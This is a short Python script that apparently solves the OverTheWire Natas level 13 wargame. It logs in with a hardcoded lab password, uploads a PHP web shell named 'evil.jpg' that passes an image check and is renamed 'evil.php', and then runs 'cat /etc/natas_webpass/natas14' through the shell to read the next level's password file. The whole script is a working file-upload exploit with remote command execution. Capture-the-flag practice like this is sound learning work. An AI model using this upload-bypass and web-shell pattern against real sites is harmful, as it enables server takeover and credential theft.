import requests
import re

username = "natas13"
password = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
url = f"http://{username}.natas.labs.overthewire.org/"

payload = open("C:\\Users\\bens\\Desktop\\natas\\evil.jpg", "rb")

session = requests.Session()

response = session.post(url, auth=(username, password), files={'uploadedfile': payload}, data={'filename': 'evil.php', 'submit': 'submit'})

content = response.text

uploaded = re.findall(r'<a href="upload/(.*).php">', content)[0]

cmd = "cat /etc/natas_webpass/natas14" # only change needed from natas12 script

shell = session.get(url + "upload/" + uploaded + f".php?cmd={cmd}", auth=(username, password))

shell_response = shell.text

flag = re.findall(r"\n(.*)\n", shell_response)[0]

print(flag)